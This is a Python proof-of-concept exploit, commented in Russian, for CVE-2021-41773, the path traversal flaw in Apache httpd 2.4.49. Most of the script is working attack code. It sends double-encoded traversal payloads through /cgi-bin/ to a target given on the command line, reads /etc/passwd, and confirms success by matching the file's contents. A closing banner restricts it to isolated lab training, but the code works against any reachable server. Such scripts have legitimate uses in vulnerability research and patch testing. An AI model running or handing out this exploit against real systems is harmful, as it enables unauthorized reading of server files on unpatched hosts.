#!/usr/bin/env python3
"""
PoC для CVE-2021-41773
Проверено на httpd:2.4.49-alpine без бэкпорт-патчей
"""

import sys
import urllib.request
import urllib.error
import urllib.parse

def exploit(target="http://localhost:8080", file="/etc/passwd"):
    # ПРАВИЛЬНЫЙ ВЕКТОР ДЛЯ 2.4.49: двойное кодирование точки (%2e → %252e)
    # .%2e → после первого декодирования остаётся .%2e → блокируется
    # .%%32%65 → %25 = '%', %32%65 = '2e' → после 1-го декод: .%2e → после 2-го: ..
    
    # Вариант 1: классический для 2.4.49
    payload1 = "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65" + file
    
    # Вариант 2:
    payload2 = "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65" + urllib.parse.quote(file)
    
    for payload in [payload1, payload2]:
        url = target.rstrip('/') + payload
        print(f"[*] Пробую: {url[:80]}...")
        
        try:
            req = urllib.request.Request(url, headers={
                "User-Agent": "Mozilla/5.0",
                "Accept": "*/*",
                "Connection": "close"
            })
            with urllib.request.urlopen(req, timeout=10) as resp:
                data = resp.read().decode('utf-8', errors='ignore')
                
                # Проверяем признаки успеха
                if ("root:" in data or "daemon:" in data or "nobody:" in data or 
                    "USER: uid=82" in data or "bin:" in data):
                    print("\n" + "="*70)
                    print("УЯЗВИМОСТЬ ПОДТВЕРЖДЕНА! (CVE-2021-41773)")
                    print("="*70)
                    print(data[:800].strip())
                    print("="*70)
                    return True
                else:
                    print(f"Код 200, но содержимое не распознано (возможно, не тот файл)")
                    
        except urllib.error.HTTPError as e:
            if e.code == 403:
                print(f"403 Forbidden — фильтрация работает (возможно, патченная версия)")
            elif e.code == 404:
                print(f"404 Not Found — проверьте путь /cgi-bin/")
            else:
                print(f"HTTP {e.code}")
        except urllib.error.URLError as e:
            print(f"Ошибка подключения: {e.reason}")
            return False
    
    print("\nУязвимость НЕ воспроизведена. Возможные причины:")
    print("1. Версия Apache НЕ 2.4.49 (проверьте: curl -I http://localhost:8080 | grep Server)")
    print("2. Образ содержит частичный патч")
    print("3. mod_cgi не включён")
    print("\nРешение: используйте другой образ")
    return False

def test_basic_access(target):
    """Проверка базовой работоспособности"""
    try:
        with urllib.request.urlopen(f"{target}/cgi-bin/test.sh", timeout=5) as resp:
            if resp.status == 200:
                print("CGI-скрипт доступен (базовая проверка пройдена)")
                return True
    except:
        pass
    print("CGI-скрипт недоступен, проверьте конфигурацию")
    return False

if __name__ == "__main__":
    print("="*70)
    print("PoC: CVE-2021-41773 Path Traversal в Apache 2.4.49")
    print("="*70 + "\n")
    
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
    
    # Базовая проверка
    test_basic_access(target)
    
    # Основная атака
    exploit(target, "/etc/passwd")
    
    print("\n" + "="*70)
    print("ТОЛЬКО ДЛЯ ОБУЧЕНИЯ В ИЗОЛИРОВАННОЙ ЛАБОРАТОРИИ!")
    print("="*70)
